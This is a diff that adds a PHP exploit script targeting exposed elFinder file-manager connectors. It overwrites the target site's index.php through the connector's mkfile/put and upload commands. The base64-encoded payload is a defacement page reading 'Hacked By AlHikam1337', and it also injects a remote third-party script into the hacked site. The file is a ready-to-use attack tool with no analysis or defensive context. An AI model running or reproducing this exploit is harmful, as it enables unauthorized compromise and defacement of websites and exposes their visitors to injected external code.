@@ -1,0 +1,75 @@
+<?php
+// Coded by Tu5b0l3d :*
+// ReCoded by AlHikam1337 :3
+ 
+error_reporting(0);
+if($argv[1]==""){
+    echo "\nUsage: php xploit.php www.website.host/connector.php\n\n";
+}
+else{
+$target = $argv[1]; // https://www.websites.host/elfinder/connector.php
+$nama_doang = "index.php"; // file name, done.
+ 
+$isi_nama_doang = "PCFET0NUWVBFIGh0bWw+DQo8SFRNTD4NCjxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgaHJlZj0iaHR0cHM6Ly93d3cuZGVmYWNlci5pZC9mYXZpY29uLnBuZyIgdHlwZT0iaW1hZ2UveC1pY29uIj4NCjxoZWFkPg0KPHRpdGxlPkluZG9uZXNpYW4gRnJlZWRvbSBTZWN1cml0eTwvdGl0bGU+DQo8bWV0YSBuYW1lPSJEZXNjcmlwdGlvbiIgY29udGVudD0iVGhlIHdlYnNpdGUgaGFzIGJlZW4gaGFja2VkIj4NCjxtZXRhIG5hbWU9IktleXdvcmRzIiBjb250ZW50PSJBbEhpa2FtMTMzNyI+DQo8bWV0YSBuYW1lPSJBdXRob3IiIGNvbnRlbnQ9IkFsSGlrYW0xMzM3Ij4NCjxzY3JpcHQgZGF0YS10eXBlPSJpbmplY3RlZCIgc3JjPSIvL3d3dy50ZWNobm9sb2dpZXl2b25saGV1cmV1eC5jb20vYWRkb24vc2NyaXB0L2NvbnRlbnRfc2l0ZT9pbnRlZ3JhdGlvbj1hbnl3aGVyZSZ2PW4xMS4xMi4xLjE0NSZvc19taj02Jm9zX21uPTEmb3NfYml0bmVzcz0zMiZtaWQ9ZWE4OTYyNmJmMzVmZjg5ZmI2ZmMwZDdkN2MyOWNlNTMmdWlkPUM2ODk3MjlGQ0RGMTU2NzM5MjA4NjE1OTE3MkU2RUM2JmFpZD00NzcwJmFpZDI9bm9uZSZ0cz0xNDgwNjA3NTI4JnRzMj0mcHNkPXRydWUiPjwvc2NyaXB0PjwvaGVhZD4NCjxib2R5IGJnY29sb3I9ImJsYWNrIj4NCjxjZW50ZXI+DQo8aW1nIHRpdGxlPSJBbEhpa2FtMTMzN0BHbWFpbC5jb20iIHNyYz0iaHR0cHM6Ly93d3cud2FsbGRldmlsLmNvbS93YWxscGFwZXJzL3cwMS81MzkzMTYtYmxhY2stYmFja2dyb3VuZC1qb2NrZXItdGhlLWRhcmsta25pZ2h0LXRoZS1qb2tlci5qcGciIHdpZHRoPSI1MDBweCIgaGVpZ2h0PSIzMDAiPg0KPGJyPg0KPGZvbnQgY29sb3I9InJlZCIgc2l6ZT0iNyIgZmFjZT0iQWdlbmN5IEZCIj5IYWNrZWQgQnkgQWxIaWthbTEzMzc8L2ZvbnQ+DQo8YnI+DQo8Zm9udCBjb2xvcj0icmVkIiBzaXplPSI0IiBmYWNlPSJBZ2VuY3kgRkIiPlsgPGZvbnQgY29sb3I9IndoaXRlIj5NZXNzYWdlPC9mb250PiBdPC9mb250Pg0KPGJyPg0KPGZvbnQgY29sb3I9ImdyZWVuIiBzaXplPSI1IiBmYWNlPSJDaGlsbGVyIj4NCkkndmUgYmVlbiB3YWl0aW5nIGZvciB5b3Ugc2luY2UgMyB5ZWFycyBhZ28sPGJyPg0KV2h5IGRpZCB5b3UgY2hvb3NlIGhpbSwgV2hpY2ggaXMgZGVmaW5pdGVseSBub3QgZ29vZCBmb3IgeW91Ljxicj4NCkkgZGlkIG5vdCBzYXksIGlmIEknbSBpbiBsb3ZlIHdpdGggeW91LDxicj4NClNpbmNlIEkgZG8gbm90IGRhcmUgdG8gdGFsayBhYm91dCBmZWVsaW5ncy48YnI+DQpEbyBJIGhhdmUgdG8gd2FpdCBmb3IgeW91IGFnYWluPzxicj48L2ZvbnQ+DQo8YnI+DQo8Zm9udCBjb2xvcj0icmVkIj4NCjxwcmU+SW5kb25lc2lhbiBGcmVlZG9tIFNlY3VyaXR5DQo8Zm9udCBjb2xvcj0id2hpdGUiPks0TVZSM1Q3MTcgLSBGUks0OCAtIE1yLk00bmMhazI4MCAtIC4vOWhvc3QgLSBLdXJhbWEgLSBObyBXYXIgLSAxN19QZXJzb25Ob3RGb3VuZA0KLi9Nci4gSGFueklEIC0gQVpaQVRTU0lOUyAtIC4vTXIuQmxhbmswMDc8L3ByZT48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0icmVkIj4NCjxwcmU+R3JlZXR6DQo8Zm9udCBjb2xvcj0id2hpdGUiPlhhaVN5bmRpY2F0ZTwvcHJlPjwvZm9udD4NCjwvY2VudGVyPg0KPGVtYmVkIHNyYz0iaHR0cDovL3d3dy55b3V0dWJlLmNvbS92L3ZFdlktazFFTlFFJmF1dG9wbGF5PTEiIHR5cGU9ImFwcGxpY2F0aW9uL3gtc2hvY2t3YXZlLWZsYXNoIiB3bW9kZT0idHJhbnNwYXJlbnQiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiPjwvZW1iZWQ+DQo8L2JvZHk+DQo8L0hUTUw+"; // Base64 Script
+ 
+ 
+$decode_isi = base64_decode($isi_nama_doang);
+$encode = base64_encode($nama_doang);
+ 
+$fp = fopen($nama_doang,"w");
+fputs($fp, $decode_isi);
+ 
+function ngirim($url, $isi){
+ 
+ 
+$ch = curl_init ("$url");
+curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt ($ch, CURLOPT_POST, 1);
+curl_setopt ($ch, CURLOPT_POSTFIELDS, $isi);
+curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
+curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
+$data3 = curl_exec ($ch);
+return $data3;
+ 
+}
+echo "\n# $target\n# Uploading 1...\n";
+$url_mkfile = "$target?cmd=mkfile&name=$nama_doang&target=l1_Lw";
+$b = file_get_contents("$url_mkfile");
+ 
+ $post1 = array(
+                    "cmd" => "put",
+                    "target" => "l1_$encode",
+                    "content" => "$decode_isi",
+                   
+                    );
+ $post2 = array(
+                   
+                    "current" => "8ea8853cb93f2f9781e0bf6e857015ea",
+                    "upload[]" => "@$nama_doang",
+                   
+                    );
+ 
+$output_mkfile = ngirim("$target", $post1);
+if(preg_match("/$nama_doang/", $output_mkfile)){
+    echo "# Upload Success 1...\nFile successfully uploaded, the location of the file you are looking for yourself\nFile name, $nama_doang\n";
+}
+else{
+ 
+echo "# Upload Failed 1 \n# Uploading 2..\n";
+$upload_ah = ngirim("$target?cmd=upload", $post2);
+if(preg_match("/$nama_doang/", $upload_ah)){
+    echo "# Upload Success 2\nFile successfully uploaded, the location of the file you are looking for yourself\nFile name, $nama_doang\n";
+}
+else{
+    echo "# Upload Failed 2\n\n";
+}
+ 
+ 
+}
+}
+ 
+?>
